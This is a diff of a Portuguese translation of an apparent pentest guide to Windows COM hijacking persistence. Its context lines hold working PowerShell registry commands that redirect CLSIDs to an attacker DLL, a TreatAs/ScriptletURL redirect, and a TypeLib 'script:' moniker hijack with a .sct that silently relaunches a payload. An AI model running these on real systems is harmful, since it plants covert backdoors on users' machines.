@@ -4,20 +4,20 @@
 
 ### Procurando componentes COM inexistentes
 
-Como os valores de HKCU podem ser modificados pelos usuários, **COM Hijacking** pode ser usado como um **persistence mechanism**. Usando `procmon` é fácil encontrar entradas de registro COM procuradas que ainda não existem e que poderiam ser criadas por um atacante. Filtros clássicos:
+Como os valores de HKCU podem ser modificados pelos usuários, **COM Hijacking** poderia ser usado como um **persistence mechanism**. Usando `procmon` é fácil encontrar chaves de registro COM pesquisadas que ainda não existem e que poderiam ser criadas por um atacante. Filtros clássicos:
 
-- Operações **RegOpenKey**.
+- operações **RegOpenKey**.
 - onde o _Result_ é **NAME NOT FOUND**.
 - e o _Path_ termina com **InprocServer32**.
 
-Variações úteis durante hunting:
+Variações úteis durante a busca:
 
-- Também procure por chaves **`LocalServer32`** ausentes. Algumas classes COM são servidores fora do processo e irão iniciar um EXE controlado pelo atacante em vez de uma DLL.
-- Procure por operações de registro **`TreatAs`** e **`ScriptletURL`** além de `InprocServer32`. Conteúdo recente de detecção e writeups de malware continuam destacando esses porque são muito mais raros que registros COM normais e, portanto, de alto sinal.
-- Copie o legítimo **`ThreadingModel`** do `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32` original ao clonar uma entrada para HKCU. Usar o modelo errado frequentemente quebra a ativação e torna o hijack ruidoso.
-- Em sistemas 64-bit, inspecione tanto as visões 64-bit quanto 32-bit (`procmon.exe` vs `procmon64.exe`, `HKLM\Software\Classes` e `HKLM\Software\Classes\WOW6432Node`) porque aplicações 32-bit podem resolver um registro COM diferente.
+- Também procure por chaves **`LocalServer32`** ausentes. Algumas classes COM são servidores out-of-process e vão lançar um EXE controlado pelo atacante em vez de uma DLL.
+- Busque por operações de registro **`TreatAs`** e **`ScriptletURL`** além de `InprocServer32`. Conteúdo recente de detecção e writeups de malware continuam chamando atenção para esses porque são muito mais raros do que registros COM normais e, portanto, de alto sinal.
+- Copie o legítimo **`ThreadingModel`** do original `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32` ao clonar um registro para HKCU. Usar o modelo errado frequentemente quebra a ativação e torna o hijack barulhento.
+- Em sistemas 64-bit inspecione tanto as visões 64-bit quanto 32-bit (`procmon.exe` vs `procmon64.exe`, `HKLM\Software\Classes` e `HKLM\Software\Classes\WOW6432Node`) porque aplicações 32-bit podem resolver um registro COM diferente.
 
-Uma vez decidido qual COM inexistente você vai impersonar, execute os comandos a seguir. _Cuidado se decidir impersonar um COM que é carregado a cada poucos segundos, pois isso pode ser excessivo._
+Uma vez que você tenha decidido qual COM inexistente personificar, execute os comandos a seguir. _Tenha cuidado se decidir personificar um COM que é carregado a cada poucos segundos, pois isso pode ser excessivo._
 ```bash
 New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
 New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
@@ -25,7 +25,7 @@ New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F
 ```
 ### Componentes COM do Task Scheduler que podem ser sequestrados
 
-Windows Tasks usam Custom Triggers para chamar objetos COM e, por serem executadas através do Task Scheduler, é mais fácil prever quando serão disparadas.
+As Windows Tasks usam Custom Triggers para chamar COM objects e, por serem executadas através do Task Scheduler, é mais fácil prever quando serão acionadas.
 
 <pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
 $Tasks = Get-ScheduledTask
@@ -56,9 +56,9 @@ Write-Host
 # CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
 # [more like the previous one...]</code></pre>
 
-Analisando a saída, você pode selecionar uma que será executada **toda vez que um usuário fizer login**, por exemplo.
+Analisando a saída, você pode selecionar uma que, por exemplo, será executada **toda vez que um usuário fizer logon**.
 
-Agora, ao procurar o CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** em **HKEY\CLASSES\ROOT\CLSID** e em HKLM e HKCU, normalmente você verá que o valor não existe em HKCU.
+Ao procurar o CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** em **HKEY\CLASSES\ROOT\CLSID** e em HKLM e HKCU, você normalmente verá que o valor não existe em HKCU.
 ```bash
 # Exists in HKCR\CLSID\
 Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"
@@ -79,7 +79,7 @@ Name                                   Property
 PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
 Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
 ```
-Então, você pode simplesmente criar a entrada HKCU e toda vez que o usuário fizer logon, seu backdoor será executado.
+Então, você pode simplesmente criar a entrada HKCU e, toda vez que o usuário fizer logon, seu backdoor será disparado.
 
 ---
 
@@ -90,7 +90,7 @@ Então, você pode simplesmente criar a entrada HKCU e toda vez que o usuário f
 Isso é útil quando:
 
 - o aplicativo alvo já instancia um CLSID estável no logon ou na inicialização do app
-- você quer um redirecionamento somente via registro em vez de substituir o `InprocServer32` original
+- você quer um redirecionamento apenas no registro em vez de substituir o `InprocServer32` original
 - você quer executar um scriptlet `.sct` local ou remoto através do valor `ScriptletURL`
 
 Exemplo de fluxo de trabalho (adaptado do tradecraft público do Atomic Red Team e de pesquisas mais antigas sobre abuso do registro COM):
@@ -108,19 +108,19 @@ reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\Trea
 ```
 Notas:
 
-- `scrobj.dll` lê o valor `ScriptletURL` e executa o `.sct` referenciado, então você pode manter o payload como um arquivo local ou carregá-lo remotamente via HTTP/HTTPS.
-- `TreatAs` é especialmente útil quando o registro COM original está completo e estável em `HKLM`, porque você precisa apenas de um pequeno redirecionamento por usuário em vez de espelhar toda a árvore.
-- Para validação sem esperar pelo gatilho natural, você pode instanciar o ProgID/CLSID falso manualmente com `rundll32.exe -sta <ProgID-or-CLSID>` se a classe alvo suportar ativação STA.
+- `scrobj.dll` lê o valor `ScriptletURL` e executa o `.sct` referenciado, então você pode manter o payload como um arquivo local ou buscá-lo remotamente via HTTP/HTTPS.
+- `TreatAs` é especialmente útil quando o registro COM original está completo e estável em HKLM, porque você precisa apenas de um pequeno redirecionamento per-user em vez de espelhar toda a árvore.
+- Para validação sem esperar pelo gatilho natural, você pode instanciar manualmente o ProgID/CLSID falso com `rundll32.exe -sta <ProgID-or-CLSID>` se a classe alvo suportar ativação STA.
 
 ## COM TypeLib Hijacking (script: moniker persistence)
 
-Type Libraries (TypeLib) definem interfaces COM e são carregadas via `LoadTypeLib()`. Quando um servidor COM é instanciado, o SO também pode carregar o TypeLib associado consultando chaves de registro sob `HKCR\TypeLib\{LIBID}`. Se o caminho do TypeLib for substituído por um **moniker**, e.g. `script:C:\...\evil.sct`, o Windows executará o scriptlet quando o TypeLib for resolvido — resultando em uma persistência discreta que é acionada quando componentes comuns são acessados.
+Type Libraries (TypeLib) definem interfaces COM e são carregadas via `LoadTypeLib()`. Quando um servidor COM é instanciado, o OS também pode carregar o TypeLib associado consultando chaves de registro sob `HKCR\TypeLib\{LIBID}`. Se o caminho do TypeLib for substituído por um **moniker**, e.g. `script:C:\...\evil.sct`, o Windows executará o scriptlet quando o TypeLib for resolvido — gerando uma persistência discreta que é acionada quando componentes comuns são acessados.
 
-Isso foi observado contra o Microsoft Web Browser control (frequentemente carregado pelo Internet Explorer, apps embedding WebBrowser, e até `explorer.exe`).
+Isso foi observado contra o Microsoft Web Browser control (frequentemente carregado pelo Internet Explorer, apps embedding WebBrowser, e até mesmo `explorer.exe`).
 
 ### Passos (PowerShell)
 
-1) Identifique o TypeLib (LIBID) usado por um CLSID de alta frequência. Exemplo de CLSID frequentemente abusado por cadeias de malware: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).
+1) Identifique o TypeLib (LIBID) usado por um CLSID de alta frequência. Exemplo de CLSID frequentemente abusado por malware chains: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).
 ```powershell
 $clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
 $libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
@@ -133,7 +133,7 @@ $dest = 'C:\\ProgramData\\Udate_Srv.sct'
 New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
 Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
 ```
-3) Drop um JScript `.sct` mínimo que relança seu payload principal (por exemplo, um `.lnk` usado pela cadeia inicial):
+3) Drop um `.sct` JScript mínimo que reexecute o seu payload principal (por exemplo, um `.lnk` usado pela cadeia inicial):
 ```xml
 <?xml version="1.0"?>
 <scriptlet>
@@ -150,7 +150,7 @@ sh.Run(cmd, 0, false);
 </script>
 </scriptlet>
 ```
-4) Disparo – abrir o IE, uma aplicação que incorpora o WebBrowser control, ou mesmo atividades rotineiras do Explorer carregarão o TypeLib e executarão o scriptlet, rearmando sua cadeia no logon/reboot.
+4) Ativação – abrir o IE, uma aplicação que incorpora o WebBrowser control, ou mesmo a atividade rotineira do Explorer irá carregar a TypeLib e executar o scriptlet, rearmando sua cadeia no logon/reboot.
 
 Limpeza
 ```powershell
@@ -161,7 +161,7 @@ Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
 ```
 Notas
 - Você pode aplicar a mesma lógica a outros componentes COM de alta frequência; sempre resolva o `LIBID` real a partir de `HKCR\CLSID\{CLSID}\TypeLib` primeiro.
-- Em sistemas 64-bit você também pode preencher a subchave `win64` para consumidores de 64-bit.
+- Em sistemas 64-bit você também pode preencher a subchave `win64` para consumidores 64-bit.
 
 ## Referências
 
